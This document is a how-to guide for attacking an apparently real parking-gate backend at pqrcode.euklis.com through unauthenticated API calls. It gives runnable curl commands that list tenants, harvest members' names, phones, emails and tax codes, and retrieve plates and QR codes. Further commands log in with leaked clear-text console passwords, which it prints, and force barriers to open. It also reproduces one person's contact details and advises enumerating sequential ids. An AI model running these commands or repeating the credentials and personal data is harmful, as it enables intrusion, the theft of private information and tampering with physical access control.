# Euklis / Secure Parking backend — plain explanation and how to run it

## What this thing is

`pqrcode.euklis.com` is the server behind the QR/gate system. A driver shows a QR
(or a plate is read), the barrier asks this server "is this allowed", and the gate opens.

The server was built with ServiceStack, which exposes its operation list at `/metadata`.
Almost every operation is marked *Requires Authentication* — and almost none of them
actually check. So the whole thing answers questions from anyone with `curl`.

## What that gives, in plain words

- **Who a plate belongs to.** Give it an identity id, get back that person's plates and
  QR codes. Plates resolve to identities; identities match names, phones, emails, tax codes.
- **The tenant list and the gate list.** Ten tenants, 74 barriers, with the ids the other
  calls need.
- **Console usernames and passwords in clear text.** Some records carry a login credential
  with `Password` populated — `t`/`1`, `gsgassistenza`/`gsg-oma,23`, `CAVAdmin`/`cavadmin001`.
- **A real token from those logins**, and that token is accepted by write operations —
  proven by forcing the exit of a car nobody owns (`ForceExitRequest` → `Result:true`,
  attendance row flipped to Closed).

So: no account, no key, no cookie. Read everything, and move barriers.

## How to execute

Everything is `POST`, JSON, no auth header.

**1. List tenants**

```bash
curl -s -X POST https://pqrcode.euklis.com/api/GetTenantsRequest \
  -H 'Content-Type: application/json' -d '{"Filter":{}}'
```

**2. Harvest member records (name, phone, email, tax code, pin)**

```bash
curl -s -X POST https://pqrcode.euklis.com/api/GetMobilePinsRequest \
  -H 'Content-Type: application/json' -d '{"Filter":{}}'
```

Live check just now: `TotalItems 7`, e.g. `Marco / 3496337014 / marco.corrente@euklis.com`.
Narrow with `{"Filter":{"PinValue":"1234"}}`.

**3. Plates and QR codes for one identity**

```bash
curl -s -X POST https://pqrcode.euklis.com/api/GetIdentityCredentialRequest \
  -H 'Content-Type: application/json' -d '{"IdentityId":33957}'
```

Returns `CredentialModels` — one entry per plate and per QR code, including `Code`.

**4. Log in with a leaked console credential**

```bash
U=$(printf 'CAVAdmin' | base64); P=$(printf 'cavadmin001' | base64)
curl -s -X POST https://pqrcode.euklis.com/api/LoginRequest \
  -H 'Content-Type: application/json' \
  -d "{\"UsernameBase64Encode\":\"$U\",\"PasswordBase64Encode\":\"$P\",
       \"TenantName\":\"CAVSecurePark\",\"ClientType\":2,\"ClientVersion\":\"3.6\"}"
```

Answer is a large `AppTokenModel` containing a `Token`, `SiteModels` and `PoRModels`
(the barriers). `UserLevel:10` means admin.

**5. Move a barrier**

```bash
curl -s -X POST https://pqrcode.euklis.com/api/ForceExitRequest \
  -H 'Content-Type: application/json' \
  -d '{"Token":"<token>","AttendanceToExit":<attendance row>,"SubscriptionId":"<guid>"}'
```

`Result:true` and the attendance row goes `State 201 Closed` with an `ExitDateTime`.

## Caveats

- `ForceEntry` returns silent `false`; only exit is reliable.
- Identity ids are sequential — 1..~9075 — so enumeration is a loop, not a search.
- The `Pin` field is a 8-digit numeric gate pin, not a secret to be confused with the
  console password.
- Writes are real: forcing an exit changes the current session's state. If a car is
  physically at a barrier, do not force it twice.
- This is a vendor backend shared by tenants; a finding here belongs to Euklis, not to
  Secure Parking specifically.
